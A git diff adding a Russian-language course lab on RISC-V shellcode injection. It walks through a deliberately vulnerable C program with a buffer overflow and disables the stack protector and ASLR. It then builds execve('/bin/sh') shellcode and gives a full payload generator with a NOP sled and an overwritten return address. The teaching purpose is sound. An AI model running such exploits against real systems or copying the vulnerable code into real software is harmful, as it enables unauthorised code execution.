@@ -1,0 +1,385 @@
+ifdef::env-github[]
+:tip-caption: :bulb:
+:note-caption: :memo:
+:important-caption: :heavy_exclamation_mark:
+:caution-caption: :fire:
+:warning-caption: :warning:
+endif::[]
+
+= Shellcode injection RISC-V
+:source-highlighter: rouge
+:rouge-style: github
+:icons: font
+:sectnums:
+
+== Как выполнять
+
+Данный практикум можно выполнять как с использованием плат, так и виртуальных машин.
+
+Сборник программного обеспечения инструментов разработки «Syntacore Early Access Kit» (виртуальная машина и тулчейн) 
+https://riscv-alliance.ru/news/alyans-risc-v-dayot-universitetam-dostup-k-resursam-dlya-obucheniya-i-issledovanij/[можно запросить у Альянса RISC-V].
+
+Также можно самостоятельно https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html[настроить RISC-V Linux в QEMU].
+
+Компиляцию и просмотр дизассемблированного кода можно выполнять либо на девайсе (плата/виртуальная машина) нативно, либо используя кросс-тулчейн (в таком случае во всех примерах надо добавить префикс тулчейна, например `riscv64-linux-gnu-`).
+
+== Создадим очень уязвимую программу
+
+[source, c]
+----
+#include <stdio.h>
+#include <unistd.h>
+
+void func() {
+     char buf[100];
+     read(0, buf, 120); // Тут случится переполнение буфера
+     printf("Welcome %s\n", buf);
+}
+
+int main() {
+    func();
+    return 0;
+}
+----
+
+=== Скомпилируем код (и проигнорируем предупреждения компилятора)
+
+[source, shell]
+----
+gcc -o vuln -march=rv64gc vuln.c
+----
+
+Запустим программу несколько раз и посмотрим на карту адресного пространства (`/proc/<pid>/maps`).
+
+[listing]
+----
+555560808000-555560809000 r-xp 00000000 fc:01 767245                     /home/ubuntu/vkutuev/vuln
+555560809000-55556080a000 r--p 00000000 fc:01 767245                     /home/ubuntu/vkutuev/vuln
+55556080a000-55556080b000 rw-p 00001000 fc:01 767245                     /home/ubuntu/vkutuev/vuln
+7fff8eb42000-7fff8ec63000 r-xp 00000000 fc:01 259386                     /usr/lib/riscv64-linux-gnu/libc.so.6
+7fff8ec63000-7fff8ec64000 ---p 00121000 fc:01 259386                     /usr/lib/riscv64-linux-gnu/libc.so.6
+7fff8ec64000-7fff8ec67000 r--p 00121000 fc:01 259386                     /usr/lib/riscv64-linux-gnu/libc.so.6
+7fff8ec67000-7fff8ec69000 rw-p 00124000 fc:01 259386                     /usr/lib/riscv64-linux-gnu/libc.so.6
+7fff8ec69000-7fff8ec77000 rw-p 00000000 00:00 0
+7fff8ec7d000-7fff8ec7f000 r--p 00000000 00:00 0                          [vvar]
+7fff8ec7f000-7fff8ec81000 r-xp 00000000 00:00 0                          [vdso]
+7fff8ec81000-7fff8ec9f000 r-xp 00000000 fc:01 259331                     /usr/lib/riscv64-linux-gnu/ld-linux-riscv64-lp64d.so.1
+7fff8eca0000-7fff8eca2000 r--p 0001e000 fc:01 259331                     /usr/lib/riscv64-linux-gnu/ld-linux-riscv64-lp64d.so.1
+7fff8eca2000-7fff8eca4000 rw-p 00020000 fc:01 259331                     /usr/lib/riscv64-linux-gnu/ld-linux-riscv64-lp64d.so.1
+7ffff4124000-7ffff4145000 rw-p 00000000 00:00 0                          [stack]
+----
+
+[listing]
+----
+555594712000-555594713000 r-xp 00000000 fc:01 767245                     /home/ubuntu/vkutuev/vuln
+555594713000-555594714000 r--p 00000000 fc:01 767245                     /home/ubuntu/vkutuev/vuln
+555594714000-555594715000 rw-p 00001000 fc:01 767245                     /home/ubuntu/vkutuev/vuln
+7fff9be03000-7fff9bf24000 r-xp 00000000 fc:01 259386                     /usr/lib/riscv64-linux-gnu/libc.so.6
+7fff9bf24000-7fff9bf25000 ---p 00121000 fc:01 259386                     /usr/lib/riscv64-linux-gnu/libc.so.6
+7fff9bf25000-7fff9bf28000 r--p 00121000 fc:01 259386                     /usr/lib/riscv64-linux-gnu/libc.so.6
+7fff9bf28000-7fff9bf2a000 rw-p 00124000 fc:01 259386                     /usr/lib/riscv64-linux-gnu/libc.so.6
+7fff9bf2a000-7fff9bf38000 rw-p 00000000 00:00 0
+7fff9bf3e000-7fff9bf40000 r--p 00000000 00:00 0                          [vvar]
+7fff9bf40000-7fff9bf42000 r-xp 00000000 00:00 0                          [vdso]
+7fff9bf42000-7fff9bf60000 r-xp 00000000 fc:01 259331                     /usr/lib/riscv64-linux-gnu/ld-linux-riscv64-lp64d.so.1
+7fff9bf61000-7fff9bf63000 r--p 0001e000 fc:01 259331                     /usr/lib/riscv64-linux-gnu/ld-linux-riscv64-lp64d.so.1
+7fff9bf63000-7fff9bf65000 rw-p 00020000 fc:01 259331                     /usr/lib/riscv64-linux-gnu/ld-linux-riscv64-lp64d.so.1
+7ffff401b000-7ffff403c000 rw-p 00000000 00:00 0                          [stack]
+----
+
+Заметим, что
+- область памяти, отведённая под стек, защищена от исполнения;
+- между запусками адреса поменялись.
+
+Это осложняет проведение атак по переполнению буфера.
+
+=== Избавимся от защиты стека
+
+[source, shell]
+----
+gcc -o vuln -march=rv64gc -fno-stack-protector -z execstack vuln.c
+----
+
+Флаги:
+- `-fno-stack-protector` -- отключить проверки переполнений буфера на стеке (скорее всего по умолчанию компилятор проверок не вставляет, но может быть нужным для нестандартно собранного компилятора);
+- `-z execstack` -- просим линкер собрать исполняемый файл требующий исполняемый стек.
+
+=== Отключаем https://en.wikipedia.org/wiki/Address_space_layout_randomization[ASLR]
+
+
+[source, shell]
+----
+sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
+----
+
+== Посмотрим на дизассемблированный `vuln`
+
+[source, shell]
+----
+objdump -d vuln
+----
+
+[listing]
+----
+00000000000006b8 <func>:
+ 6b8:	7119      addi  sp,sp,-128
+ 6ba:	fc86      sd    ra,120(sp)
+ 6bc:	f8a2      sd    s0,112(sp)
+ 6be:	0100      addi  s0,sp,128
+ 6c0:	f8840793  addi  a5,s0,-120
+ 6c4:	07800613  li    a2,120
+ 6c8:	85be      mv    a1,a5
+ 6ca:	4501      li    a0,0
+ 6cc:	f15ff0ef  jal   ra,5e0 <read@plt>
+ 6d0:	f8840793  addi  a5,s0,-120
+ 6d4:	85be      mv    a1,a5
+ 6d6:	00000517  auipc a0,0x0
+ 6da:	03a50513  addi  a0,a0,58 # 710 <_IO_stdin_used+0x8>
+ 6de:	f13ff0ef  jal   ra,5f0 <printf@plt>
+ 6e2:	0001      nop
+ 6e4:	70e6      ld    ra,120(sp)
+ 6e6:	7446      ld    s0,112(sp)
+ 6e8:	6109      addi  sp,sp,128
+ 6ea:	8082      ret
+----
+
+Обратим внимание на то, как устроен кадр стека
+
+`6b8`:: выделение `128` байтов под кадр стека
+`6ba`:: сохранение регистра `ra` (адреса возврата, который нам надо подменить) за `120` байтов от вершины стека, т.е. в самом начале кадра стека
+`6bc`:: сохранение указателя на предыдущий кадр стека (регистра `s0/fp`) за `112` байтов от вершины стека, т.е. перед адресом возврата
+`6be`:: обновление регистра `s0/fp` адресом текущего кадра стека
+`6c0`:: вычисление адреса `buf` -- он расположен за `120` байтов до начала кадра
+
+[listing]
+----
++-----------+
+|           |  <- sp
+| 8 байтов  |
++-----------+
+|  1 байт   |  <- buf (s0 - 120)
++-----------+
+|  1 байт   |  <- buf + 1
++-----------+
+|           |
+|    ...    |
+|           |
++-----------+
+|  1 байт   |  <- buf + 99
++-----------+
+| 4 байта   |  <- buf + 100
++-----------+
+|           |  <- buf + 104 (s0 - 16)
+| 8 байтов  |
++-----------+
+|     ra    |  <- buf + 112 (s0 - 8)
+| 8 байтов  |
++-----------+
+----
+
+== Инъекция кода
+
+Мы хотим передать в программу в качестве входа некоторый код, а также, переполнив буфер, заменить адрес возврата на адрес буфера.
+
+[listing]
+----
++-----------+
+|           |  <- sp
+| 8 байтов  |
++-----------+
+|           |  <- buf <-----+
+|           |               |
+|           |               |
+|           |               |
+|           |               |
+|           |               |
+|    код    |               |
+|  инъекции |               |
+|           |               |
+|    112    |               |
+|   байтов  |               |
+|           |               |
+|           |               |
+|           |               |
++-----------+               |
+|  my ra    |  <- buf + 112 |
+| 8 байтов  |---------------+
++-----------+
+----
+
+=== Код, который хотим выполнить (`shellcode.s`)
+
+[source]
+----
+addi sp, sp, -8           # выделение места на стеке
+li t0, 0x0068732f6e69622f # запись строки "/bin/sh" в регистр t0
+sd t0, 0(sp)              # сохранение t0 на вершине стека
+mv a0, sp                 # запись адреса строки "/bin/sh" в регистр a0
+mv a1, zero               # запись 0 в регистр a1
+mv a2, zero               # запись 0 в регистр a2
+li a7, 221                # запись номера системного вызова execve в a7
+ecall                     # выполнение системного вызова
+----
+
+[NOTE]
+====
+Подробно про соглашение о системных вызовах можно прочитать в мануале -- `man syscall`.
+
+----
+Arch/ABI    Instruction           System  Ret  Ret  Error    Notes
+                                  call #  val  val2
+───────────────────────────────────────────────────────────────────
+riscv       ecall                 a7      a0   a1   -
+----
+
+----
+Arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
+──────────────────────────────────────────────────────────────
+riscv         a0    a1    a2    a3    a4    a5    -
+----
+
+Номера системных вызовов можно посмотреть в файле `/usr/include/asm-generic/unistd.h`.
+====
+
+[NOTE]
+====
+Отметим, что `mv` и `li` -- не инструкции RISC-V.
+Это псевдоинструкци.
+Ассемблер понимает их и транслирует в машинные инструкции.
+
+Посмотреть, в какие инструкции будет транслирован такой код можно так:
+
+[source, shell]
+----
+as -o shellcode.o shellcode.s
+objdump -d -M no-aliases shellcode.o
+----
+
+Например, `mv a0,sp` будет транслирована в `addi a0,sp,0`.
+====
+
+Скомпилируем инъекцию и посмотрим на её байтовое представление.
+
+[source, shell]
+----
+as -o shellcode.o -march=rv64gc shellcode.s
+objdump -d shellcode.o
+----
+
+Попучаем последовательность байтов, содержащую инъекцию:
+`\x61\x11\xb7\x92\x39\x34\x9b\x82\x72\x7b\xb2\x02\x93\x82\xb2\x34\xb6\x02\x93\x82\xf2\x22\x16\xe0\x0a\x85\x93\x05\x00\x00\x13\x06\x00\x00\x93\x08\xd0\x0d\x73\x00\x00\x00`
+
+=== Куда делать возврат?
+
+Чтобы переданный на вход программе код выполнился необходимо провести возврат из функции на адрес `buf`.
+
+Узнать его адрес можно двумя способами.
+
+. Добавить в `func` строку `printf("%p\n", buf);`, которая распечатает адрес `buf`.
+Этот способ даст точный адрес (но способ скучный).
+. Спомощью отладчика определить значение `s0 - 120` при выполнении `func`.
+[listing]
+----
+gdb -q vuln
+(gdb) b func
+(gdb) r
+(gdb) p $s0 - 120
+----
+Этот способ даст неточный адрес, который потом надо будет подкорректировать (но способ интереснее).
+
+Т.к ASLR выключен, то адрес не будет меняться от запуска к запуску.
+
+[INFO]
+====
+В моём случае адрес возврата получился `0x7ffffffff8a8`.
+
+В вашем случае адрес возврата может отличаться, поэтому в дальнейших шагах используйте его.
+====
+
+=== Сформируем вход для `vuln`
+
+Вход будет состоять из 5 частей
+
+. `54` байта: `27` псевдоинструкций `nop` (`\x01\x00`).
+Нужны чтобы в случае, если чуть-чуть не угадали адрес возврата повысить шанс успешности атаки.
+. `42` байта: внедряемый код.
+. `16` байтов: `8` псевдоинструкций `nop` (`\x01\x00`).
+Нужны, чтобы запись строки `"/bin/sh"` на стек не перетёрла инструкции инъекции.
+. `8` байтов: адрес возврата.
+. Остальная часть стандартного входа, которая после запуска `/bin/sh` будет передана в него.
+Например, строка `"echo Hacked"`.
+
+Напишем и скомпилируем программу `injection_input.c`, которая будет печатать эти байты.
+
+[source, c]
+----
+#include <stdio.h>
+
+int main() {
+	// nop
+	for (int i = 0; i < 27; ++i) {
+		putchar('\x01');
+		putchar('\x00');
+	}
+
+	// injection
+	printf(
+	 "\x61\x11"
+	 "\xb7\x92\x39\x34"
+	 "\x9b\x82\x72\x7b"
+	 "\xb2\x02"
+	 "\x93\x82\xb2\x34"
+	 "\xb6\x02"
+	 "\x93\x82\xf2\x22"
+	 "\x16\xe0"
+	 "\x0a\x85"
+	);
+	printf("\x93\x05");
+	putchar('\x00');
+	putchar('\x00');
+	printf("\x13\x06");
+	putchar('\x00');
+	putchar('\x00');
+	printf("\x93\x08\xd0\x0d");
+	putchar('\x73');
+	putchar('\x00');
+	putchar('\x00');
+	putchar('\x00');
+
+	// nop
+	for (int i = 0; i < 8; ++i) {
+		putchar('\x01');
+		putchar('\x00');
+	}
+	
+	// return address
+	printf("\xa8\xf8\xff\xff\xff\x7f");
+	putchar('\x00');
+	putchar('\x00');
+
+	printf("echo Hacked\n");
+	return 0;
+}
+----
+
+Скомпилируем её.
+
+[source, shell]
+----
+gcc -o injection_input injection_input.c
+----
+
+== Запустим `vuln` передав ей сформированный вход
+
+[source, shell]
+----
+./injection_input | ./vuln
+----
+
+И видим, что `sh` выполнил переданную ему команду.
+
+[listing]
+----
+Welcome
+Hacked
+----
